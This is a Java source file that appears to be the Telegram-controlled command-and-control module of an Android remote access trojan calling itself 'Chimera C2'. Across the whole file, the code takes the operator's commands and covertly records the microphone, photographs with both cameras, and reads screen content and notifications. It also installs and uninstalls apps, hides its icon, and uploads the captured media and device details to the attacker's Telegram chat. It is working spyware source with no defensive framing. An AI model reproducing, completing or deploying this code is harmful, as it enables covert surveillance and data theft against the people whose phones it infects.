package com.chimera;

import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;
import androidx.core.content.FileProvider;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class TelegramBotWorker implements Runnable {
    private final Context context;
    private long lastUpdateId = 0;
    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL, FOR_MIC_DURATION, FOR_IMAGE_PARAMS, FOR_AUDIO_PARAMS }
    private WaitingState currentState = WaitingState.NONE;
    private int customDuration = 0;
    private int customScale = 100;

    public static final String NOTIFICATION_FILTER_PREF = "notification_filter_package";
    private static String notificationFilterPackage = null;
    private final Runnable activityCallback;

    public TelegramBotWorker(Context ctx, Runnable callback) {
        this.context = ctx.getApplicationContext();
        this.activityCallback = callback;
        SharedPreferences prefs = context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
        notificationFilterPackage = prefs.getString(NOTIFICATION_FILTER_PREF, null);
    }
    
    // This getter is no longer used by NotificationListener but is kept for internal consistency
    public static String getNotificationFilter() { return notificationFilterPackage; }


    @Override
    public void run() {
        while (!Thread.currentThread().isInterrupted()) {
            try { pollForUpdates(); Thread.sleep(3000); }
            catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
            catch (Exception e) { ErrorLogger.logError(context, "RunLoop", e); }
        }
    }

    private void pollForUpdates() {
        HttpURLConnection conn = null;
        try {
            String token = ConfigLoader.getBotToken();
            if (token == null) { Thread.currentThread().interrupt(); return; }
            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=20&allowed_updates=[\"message\",\"callback_query\"]";
            if (lastUpdateId > 0) urlStr += "&offset=" + (lastUpdateId + 1);
            conn = (HttpURLConnection) new URL(urlStr).openConnection();
            if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) return;
            String responseStr = streamToString(conn.getInputStream());
            JSONArray updates = new JSONObject(responseStr).getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                activityCallback.run();
                JSONObject update = updates.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                if (update.has("message")) handleMessage(update.getJSONObject("message"));
                else if (update.has("callback_query")) handleCallback(update.getJSONObject("callback_query"));
            }
        } catch (Exception e) { ErrorLogger.logError(context, "Poll", e);
        } finally { if (conn != null) conn.disconnect(); }
    }

    private void handleMessage(JSONObject msg) {
        try {
            long chatId = msg.getJSONObject("chat").getLong("id");
            if (chatId != ConfigLoader.getAdminId()) return;

            if (msg.has("document") || msg.has("photo") || msg.has("audio")) {
                handleFileUpload(msg);
                return;
            }

            if (!msg.has("text")) return;
            String text = msg.getString("text").trim();

            if (handleStatefulReply(text)) return;

            if ("/start".equals(text)) {
                sendMainPanel(chatId, 0);
            }
        } catch (Exception e) { ErrorLogger.logError(context, "HandleMessage", e); }
    }

    private boolean handleStatefulReply(String text) {
        WaitingState previousState = currentState;
        if (previousState == WaitingState.NONE) return false;
        currentState = WaitingState.NONE;

        try {
            switch (previousState) {
                case FOR_PACKAGE_NAME_LAUNCH: launchApp(text); return true;
                case FOR_PACKAGE_NAME_UNINSTALL: uninstallApp(text); return true;
                case FOR_VOLUME: setVolume(text); return true;
                case FOR_LINK_OPEN: openLink(text); return true;
                case FOR_NOTIFICATION_FILTER: setNotificationFilter(text); return true;
                case FOR_MIC_DURATION:
                    int micDuration = Integer.parseInt(text);
                    handleMicRecording(micDuration);
                    return true;
                case FOR_IMAGE_PARAMS:
                    String[] imageParams = text.split(" ");
                    customDuration = Integer.parseInt(imageParams[0]);
                    customScale = imageParams.length > 1 ? Integer.parseInt(imageParams[1]) : 100;
                    currentState = WaitingState.FOR_IMAGE_OVERLAY;
                    sendMessage("Ready for image file. It will be shown for " + customDuration + "s at " + customScale + "% scale.", context);
                    return true;
                case FOR_AUDIO_PARAMS:
                    if ("full".equalsIgnoreCase(text)) {
                        customDuration = -1;
                    } else {
                        customDuration = Integer.parseInt(text);
                    }
                    currentState = WaitingState.FOR_AUDIO_PLAY;
                    String durationText = customDuration > 0 ? "for " + customDuration + " seconds." : "completely.";
                    sendMessage("Ready for audio file. It will be played " + durationText, context);
                    return true;
                default:
                    currentState = previousState;
                    return false;
            }
        } catch (Exception e) {
            sendMessage("Invalid input. Please try the command again.", context);
            return true;
        }
    }

    private void handleFileUpload(JSONObject msg) {
        WaitingState previousState = currentState;
        currentState = WaitingState.NONE;
        try {
            String fileId = "", fileName = "tempfile";
            if (msg.has("document")) { fileId = msg.getJSONObject("document").getString("file_id"); fileName = msg.getJSONObject("document").getString("file_name");
            } else if (msg.has("photo")) { JSONArray p = msg.getJSONArray("photo"); fileId = p.getJSONObject(p.length() - 1).getString("file_id"); fileName = fileId + ".jpg";
            } else if (msg.has("audio")) { fileId = msg.getJSONObject("audio").getString("file_id"); fileName = msg.getJSONObject("audio").optString("file_name", fileId + ".mp3"); }
            switch (previousState) {
                case FOR_IMAGE_OVERLAY:
                    downloadFile(fileId, fileName, path -> {
                        Intent i = new Intent(context, OverlayService.class); i.setAction("ACTION_SHOW_IMAGE");
                        i.putExtra("imagePath", path); i.putExtra("duration", customDuration); i.putExtra("scale", customScale);
                        context.startService(i); sendMessage("Displaying image overlay...", context);
                    }); break;
                case FOR_AUDIO_PLAY:
                    downloadFile(fileId, fileName, path -> {
                        Intent i = new Intent(context, AudioPlaybackService.class); i.setAction("ACTION_PLAY_AUDIO");
                        i.putExtra("audioPath", path); i.putExtra("duration", customDuration);
                        context.startService(i); sendMessage("Playing remote audio...", context);
                    }); break;
                case FOR_APK_INSTALL:
                    if (fileName.toLowerCase().endsWith(".apk")) { downloadFile(fileId, fileName, this::installApp); }
                    else { sendMessage("Error: The uploaded file is not an APK.", context); }
                    break;
                default: sendMessage("Received a file, but I don't know what to do with it.", context); break;
            }
        } catch (Exception e) { ErrorLogger.logError(context, "HandleFileUpload", e); }
    }

    private void handleCallback(JSONObject cb) {
        try {
            String data = cb.getString("data");
            long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
            int messageId = cb.getJSONObject("message").getInt("message_id");

            answerCallbackQuery(cb.getString("id"));

            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("SCREEN_OFF"))) {
                sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context);
                return;
            }

            switch (data) {
                case "PANEL_MAIN": sendMainPanel(chatId, messageId); break;
                case "PANEL_APPS": sendAppPanel(chatId, messageId); break;
                case "PANEL_DEVICE": sendDeviceControlPanel(chatId, messageId); break;
                case "PANEL_MEDIA": sendMediaPanel(chatId, messageId); break;
                case "PANEL_SYSTEM": sendSystemPanel(chatId, messageId); break;
                case "PANEL_NOTIFS": sendNotificationPanel(chatId, messageId); break;
                case "PANEL_GESTURES": sendGesturePanel(chatId, messageId); break;
                case "PANEL_HELP": sendHelpPanel(chatId, messageId); break;
                case "ACTION_LIST_APPS": listAllApps(); break;
                case "ACTION_LAUNCH_APP": promptForState(WaitingState.FOR_PACKAGE_NAME_LAUNCH, "Reply with the package name to launch."); break;
                case "ACTION_UNINSTALL_APP": promptForState(WaitingState.FOR_PACKAGE_NAME_UNINSTALL, "Reply with the package name to uninstall."); break;
                case "ACTION_INSTALL_APP": promptForState(WaitingState.FOR_APK_INSTALL, "Upload the APK file to install."); break;
                case "ACTION_SET_VOLUME": promptForState(WaitingState.FOR_VOLUME, "Reply with a volume level from 0 to 100."); break;
                case "ACTION_SCREEN_ON": context.startActivity(new Intent(context, WakeActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); break;
                case "ACTION_SCREEN_OFF": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN); break;
                case "ACTION_FLASHLIGHT_ON": DeviceControlHandler.setFlashlightState(context, true); break;
                case "ACTION_FLASHLIGHT_OFF": DeviceControlHandler.setFlashlightState(context, false); break;
                case "ACTION_GET_DETAILS": DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context)); break;
                case "ACTION_MIC_30": handleMicRecording(30); break;
                case "ACTION_MIC_60": handleMicRecording(60); break;
                case "ACTION_MIC_CUSTOM": promptForState(WaitingState.FOR_MIC_DURATION, "Reply with the recording duration in seconds."); break;
                case "ACTION_CAM_FRONT": handleCameraCapture("CAM1", "Front Camera"); break;
                case "ACTION_CAM_BACK": handleCameraCapture("CAM2", "Back Camera"); break;
                case "ACTION_SHOW_IMAGE": promptForState(WaitingState.FOR_IMAGE_PARAMS, "Reply with duration and scale (e.g., `15 80` for 15s at 80% scale). Default is `10 100`."); break;
                case "ACTION_PLAY_AUDIO": promptForState(WaitingState.FOR_AUDIO_PARAMS, "Reply with duration in seconds, or `full` to play the entire file."); break;
                case "ACTION_OPEN_LINK": promptForState(WaitingState.FOR_LINK_OPEN, "Reply with the full URL to open (e.g., https://google.com)"); break;
                case "ACTION_HIDE_ICON_ON": DeviceControlHandler.setComponentState(context, false); sendMessage("App icon is now hidden.", context); break;
                case "ACTION_HIDE_ICON_OFF": DeviceControlHandler.setComponentState(context, true); sendMessage("App icon is now visible.", context); break;
                case "ACTION_GET_CONTENT": sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
                case "ACTION_GRANT_USAGE":
                    context.startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    sendMessage("Usage Access settings opened. Please enable permission for the app.", context);
                    break;
                case "ACTION_DEACTIVATE":
                    sendMessage("Deactivating and returning to dormant state.", context);
                    context.stopService(new Intent(context, TelegramC2Service.class));
                    break;
                case "ACTION_EXIT_PANEL": editMessage(chatId, messageId, "Control panel closed."); break;
                case "NOTIF_GET_EXISTING": context.sendBroadcast(new Intent("com.chimera.GET_ACTIVE_NOTIFICATIONS")); break;
                case "NOTIF_SET_FILTER": promptForState(WaitingState.FOR_NOTIFICATION_FILTER, "Reply with the package name to filter notifications for (e.g., com.whatsapp)."); break;
                case "NOTIF_CLEAR_FILTER": setNotificationFilter(null); break;
                case "NOTIF_ENABLE": setNotificationListenerState(true); break;
                case "NOTIF_DISABLE": setNotificationListenerState(false); break;
                case "ACC_ACTION_BACK": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK); break;
                case "ACC_ACTION_HOME": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME); break;
                case "ACC_ACTION_RECENTS": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS); break;
            }
        } catch (Exception e) { ErrorLogger.logError(context, "HandleCallback", e); }
    }

    private void sendMainPanel(long chatId, int messageId) {
        String text = "`Chimera C2` | Main Menu";
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(createButton("📱 App Management", "PANEL_APPS")).put(createButton("🕹️ Device Control", "PANEL_DEVICE")));
            rows.put(new JSONArray().put(createButton("📸 Media Control", "PANEL_MEDIA")).put(createButton("⚙️ System & Services", "PANEL_SYSTEM")));
            rows.put(new JSONArray().put(createButton("ℹ️ Help", "PANEL_HELP")).put(createButton("❌ Close Panel", "ACTION_EXIT_PANEL")));
            keyboard.put("inline_keyboard", rows);

            if (messageId == 0) {
                sendMessageWithMarkup(text, keyboard);
            } else {
                editMessageMarkup(chatId, messageId, text, keyboard);
            }
        } catch (Exception e) { ErrorLogger.logError(context, "SendMainPanel", e); }
    }

    private void sendAppPanel(long chatId, int messageId) {
        String text = "`App Management`";
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(createButton("List Apps", "ACTION_LIST_APPS")).put(createButton("Launch App", "ACTION_LAUNCH_APP")));
            rows.put(new JSONArray().put(createButton("Install APK", "ACTION_INSTALL_APP")).put(createButton("Uninstall App", "ACTION_UNINSTALL_APP")));
            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, text, keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendAppPanel", e); }
    }

    private void sendDeviceControlPanel(long chatId, int messageId) {
        String text = "`Device Control`";
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(createButton("Screen On", "ACTION_SCREEN_ON")).put(createButton("Screen Off", "ACTION_SCREEN_OFF")));
            rows.put(new JSONArray().put(createButton("Flashlight On", "ACTION_FLASHLIGHT_ON")).put(createButton("Flashlight Off", "ACTION_FLASHLIGHT_OFF")));
            rows.put(new JSONArray().put(createButton("Set Volume", "ACTION_SET_VOLUME")).put(createButton("Device Intel", "ACTION_GET_DETAILS")));
            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, text, keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendDeviceControlPanel", e); }
    }
    
    private void sendMediaPanel(long chatId, int messageId) {
        String text = "`Media Control`";
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(createButton("Front Cam", "ACTION_CAM_FRONT")).put(createButton("Back Cam", "ACTION_CAM_BACK")));
            rows.put(new JSONArray().put(createButton("Mic Rec (30s)", "ACTION_MIC_30")).put(createButton("Mic Rec (60s)", "ACTION_MIC_60")));
            rows.put(new JSONArray().put(createButton("Mic Rec (Custom)", "ACTION_MIC_CUSTOM")));
            rows.put(new JSONArray().put(createButton("Show Image", "ACTION_SHOW_IMAGE")).put(createButton("Play Audio", "ACTION_PLAY_AUDIO")));
            rows.put(new JSONArray().put(createButton("Open Link", "ACTION_OPEN_LINK")));
            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, text, keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendMediaPanel", e); }
    }

    private void sendSystemPanel(long chatId, int messageId) {
        String text = "`System & Services`";
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(createButton("Notifications", "PANEL_NOTIFS")).put(createButton("Gestures", "PANEL_GESTURES")));
            rows.put(new JSONArray().put(createButton("Get Screen Content", "ACTION_GET_CONTENT")));
            rows.put(new JSONArray().put(createButton("Show Icon", "ACTION_HIDE_ICON_OFF")).put(createButton("Hide Icon", "ACTION_HIDE_ICON_ON")));
            rows.put(new JSONArray().put(createButton("Grant Usage Access", "ACTION_GRANT_USAGE")));
            rows.put(new JSONArray().put(createButton("⚠️ DEACTIVATE ⚠️", "ACTION_DEACTIVATE")));
            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, text, keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendSystemPanel", e); }
    }

    private void sendNotificationPanel(long chatId, int messageId) {
        String text = "`Notification Control`";
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(createButton("Read Active Notifications", "NOTIF_GET_EXISTING")));
            rows.put(new JSONArray().put(createButton("Set App Filter", "NOTIF_SET_FILTER")).put(createButton("Clear App Filter", "NOTIF_CLEAR_FILTER")));
            rows.put(new JSONArray().put(createButton("Enable Service", "NOTIF_ENABLE")).put(createButton("Disable Service", "NOTIF_DISABLE")));
            rows.put(new JSONArray().put(createButton("« Back to System", "PANEL_SYSTEM")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, text, keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendNotifPanel", e); }
    }

    private void sendGesturePanel(long chatId, int messageId) {
        String text = "`Gesture Control` (Requires Accessibility Service)";
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(createButton("Back", "ACC_ACTION_BACK")).put(createButton("Home", "ACC_ACTION_HOME")).put(createButton("Recents", "ACC_ACTION_RECENTS")));
            rows.put(new JSONArray().put(createButton("« Back to System", "PANEL_SYSTEM")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, text, keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendGesturePanel", e); }
    }

    private void sendHelpPanel(long chatId, int messageId) {
        String text = "*Chimera C2 Help*\n\n" +
                      "This bot is controlled entirely through the button interface. Here is a summary of the panels:\n\n" +
                      "*App Management:*\nList, launch, install, and uninstall user applications.\n\n" +
                      "*Device Control:*\nToggle screen/flashlight, set volume, and get a detailed intelligence report on the device.\n\n" +
                      "*Media Control:*\nCapture photos, record audio from the microphone, display images on the screen, play audio, and open web links.\n\n" +
                      "*System & Services:*\nManage notifications, perform screen gestures, hide the app icon, and grant special permissions.";

        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
            keyboard.put("inline_keyboard", rows);
            editMessageMarkup(chatId, messageId, text, keyboard);
        } catch (Exception e) { ErrorLogger.logError(context, "SendHelpPanel", e); }
    }

    private void promptForState(WaitingState state, String message) {
        currentState = state;
        sendMessage(message, context);
    }
    
    private void handleMicRecording(int duration) {
        sendMessage("Recording " + duration + "s of audio...", context);
        AudioHandler.startRecording(context, duration, new AudioHandler.AudioCallback() {
            @Override public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), duration + "s Audio Capture", context); }
            @Override public void onError(String error) { sendMessage("Audio Error: " + error, context); }
        });
    }

    private void handleCameraCapture(String cameraId, String cameraName) {
        sendMessage("Capturing image from " + cameraName + "...", context);
        CameraHandler.takePicture(context, cameraId, new CameraHandler.CameraCallback() {
            @Override
            public void onPictureTaken(String filePath) {
                uploadPhoto(filePath, ConfigLoader.getAdminId(), cameraName + " Capture", context);
            }
            @Override
            public void onError(String error) {
                sendMessage("Camera Error: " + error, context);
            }
        });
    }

    private void launchApp(String packageName) {
        try {
            Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                sendMessage("App launch requested: " + packageName, context);
            } else { sendMessage("Error: Could not launch " + packageName, context); }
        } catch (Exception e) { sendMessage("Error launching app: " + e.getMessage(), context); }
    }

    private void openLink(String url) {
        try {
            if (!url.startsWith("http")) url = "http://" + url;
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            sendMessage("Opening link: " + url, context);
        } catch (Exception e) { sendMessage("Failed to open link.", context); }
    }

    private void uninstallApp(String packageName) {
        Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        sendMessage("Uninstall requested for " + packageName + ".", context);
    }

    private void installApp(String apkPath) {
        File apkFile = new File(apkPath);
        if (!apkFile.exists()) {
            sendMessage("Error: APK file not found after download.", context);
            return;
        }
        try {
            Uri apkUri = FileProvider.getUriForFile(context, context.getPackageName() + ".provider", apkFile);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
            context.startActivity(intent);
            sendMessage("Install requested for " + apkFile.getName() + ". Please check the device screen to confirm.", context);
        } catch (Exception e) {
            sendMessage("Failed to initiate installation: " + e.getMessage(), context);
            ErrorLogger.logError(context, "InstallApp", e);
        }
    }

    private void setVolume(String levelStr) {
        try {
            DeviceControlHandler.setMediaVolume(context, Integer.parseInt(levelStr));
            sendMessage("Media volume set to " + levelStr + "%.", context);
        } catch (NumberFormatException e) { sendMessage("Error: Invalid number provided.", context); }
    }

    private void setNotificationFilter(String packageName) {
        SharedPreferences prefs = context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
        prefs.edit().putString(NOTIFICATION_FILTER_PREF, packageName).apply();
        notificationFilterPackage = packageName;

        if (packageName == null || packageName.isEmpty()) {
            sendMessage("Notification filter cleared. Capturing from all apps.", context);
        } else {
            sendMessage("Notification filter set. Only capturing from: `" + packageName + "`", context);
        }
    }

    private void setNotificationListenerState(boolean enable) {
        try {
            PackageManager pm = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, NotificationListener.class);
            int state = enable ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
            sendMessage("Notification Listener service has been " + (enable ? "ENABLED" : "DISABLED") + ".", context);
        } catch (Exception e) { sendMessage("Failed to change Notification Listener state.", context); }
    }

    private void listAllApps() {
        new Thread(() -> {
            try {
                PackageManager pm = context.getPackageManager();
                List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                StringBuilder appList = new StringBuilder();
                int count = 0;
                for (ApplicationInfo app : packages) {
                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                        appList.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
                        count++;
                    }
                }
                sendMessage("*--- " + count + " User-Installed Apps ---*\n" + appList.toString(), context);
            } catch (Exception e) {
                sendMessage("Failed to list apps.", context);
            }
        }).start();
    }

    private JSONObject createButton(String text, String callbackData) throws org.json.JSONException {
        return new JSONObject().put("text", text).put("callback_data", callbackData);
    }
    
    private void downloadFile(String fileId, String fileName, FileDownloadCallback callback) {
        new Thread(() -> {
            try {
                String token = ConfigLoader.getBotToken();
                String getPathUrl = "https://api.telegram.org/bot" + token + "/getFile?file_id=" + fileId;
                String response = streamToString(new URL(getPathUrl).openConnection().getInputStream());
                String filePath = new JSONObject(response).getJSONObject("result").getString("file_path");
                String downloadUrl = "https://api.telegram.org/file/bot" + token + "/" + filePath;
                File outputFile = new File(context.getCacheDir(), fileName);
                try (InputStream is = new URL(downloadUrl).openConnection().getInputStream(); FileOutputStream fos = new FileOutputStream(outputFile)) {
                    byte[] buffer = new byte[4096]; int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) fos.write(buffer, 0, bytesRead);
                }
                callback.onFileDownloaded(outputFile.getAbsolutePath());
            } catch (Exception e) {
                ErrorLogger.logError(context, "FileDownloadError", e);
                sendMessage("Failed to download the file.", context);
            }
        }).start();
    }

    private interface FileDownloadCallback { void onFileDownloaded(String path); }
    private static String streamToString(InputStream is) throws Exception {
        ByteArrayOutputStream result = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int length;
        while ((length = is.read(buffer)) != -1) result.write(buffer, 0, length);
        return result.toString("UTF-8");
    }
    
    private void answerCallbackQuery(String callbackQueryId) {
        try {
            JSONObject body = new JSONObject();
            body.put("callback_query_id", callbackQueryId);
            post("answerCallbackQuery", body, context);
        } catch (Exception e) {
            // Non-critical, fail silently
        }
    }

    private void editMessage(long chatId, int messageId, String text) {
         try {
            JSONObject body = new JSONObject(); body.put("chat_id", chatId); body.put("message_id", messageId);
            body.put("text", text); body.put("reply_markup", new JSONObject()); body.put("parse_mode", "Markdown");
            post("editMessageText", body, context);
        } catch (Exception e) { ErrorLogger.logError(context, "EditMessage", e); }
    }

    private void editMessageMarkup(long chatId, int messageId, String text, JSONObject markup) {
        try {
            JSONObject body = new JSONObject(); body.put("chat_id", chatId); body.put("message_id", messageId);
            body.put("text", text); body.put("reply_markup", markup); body.put("parse_mode", "Markdown");
            post("editMessageText", body, context);
        } catch (Exception e) { ErrorLogger.logError(context, "EditMarkup", e); }
    }

    private void sendMessageWithMarkup(String text, JSONObject markup) {
        try {
            JSONObject body = new JSONObject(); body.put("chat_id", ConfigLoader.getAdminId());
            body.put("text", text); body.put("reply_markup", markup); body.put("parse_mode", "Markdown");
            post("sendMessage", body, context);
        } catch (Exception e) { ErrorLogger.logError(context, "SendMessageWithMarkup", e); }
    }

    public static void sendMessage(String message, Context context) {
        if (message.length() > 4000) {
            for (int i = 0; i < message.length(); i += 4000) {
                String chunk = message.substring(i, Math.min(i + 4000, message.length()));
                sendMessageChunk(chunk, context);
            }
        } else {
            sendMessageChunk(message, context);
        }
    }

    private static void sendMessageChunk(String message, Context context) {
        try {
            JSONObject body = new JSONObject(); body.put("chat_id", ConfigLoader.getAdminId());
            body.put("text", message); body.put("parse_mode", "Markdown");
            post("sendMessage", body, context);
        } catch (Exception e) { ErrorLogger.logError(context, "SendMessageHelper", e); }
    }

    public static void post(String method, JSONObject json, Context context) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/" + method);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes(StandardCharsets.UTF_8)); }
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) { ErrorLogger.logError(context, "Post", e); }
        }).start();
    }

    public static void uploadPhoto(String filePath, long chatId, String caption, Context context) {
        uploadMultipart(filePath, chatId, caption, context, "sendPhoto", "photo", "image/jpeg");
    }

    public static void uploadAudio(String filePath, long chatId, String caption, Context context) {
        uploadMultipart(filePath, chatId, caption, context, "sendAudio", "audio", "audio/mp4");
    }

    private static void uploadMultipart(String filePath, long chatId, String caption, Context context, String endpoint, String fieldName, String contentType) {
        final File fileToUpload = new File(filePath);
        if (!fileToUpload.exists()) return;
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String token = ConfigLoader.getBotToken();
                String urlStr = "https://api.telegram.org/bot" + token + "/" + endpoint;
                String boundary = "Boundary-" + System.currentTimeMillis(), LINE_FEED = "\r\n";
                conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED).append(LINE_FEED).append(caption).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileToUpload.getName() + "\"").append(LINE_FEED);
                    writer.append("Content-Type: " + contentType).append(LINE_FEED).append(LINE_FEED).flush();
                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
                        byte[] buffer = new byte[4096]; int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
                    }
                    writer.append(LINE_FEED).flush();
                    writer.append("--" + boundary + "--").append(LINE_FEED);
                }
                conn.getInputStream().close();
            } catch (Exception e) { ErrorLogger.logError(context, "Upload", e);
            } finally { if (conn != null) conn.disconnect(); fileToUpload.delete(); }
        }).start();
    }
}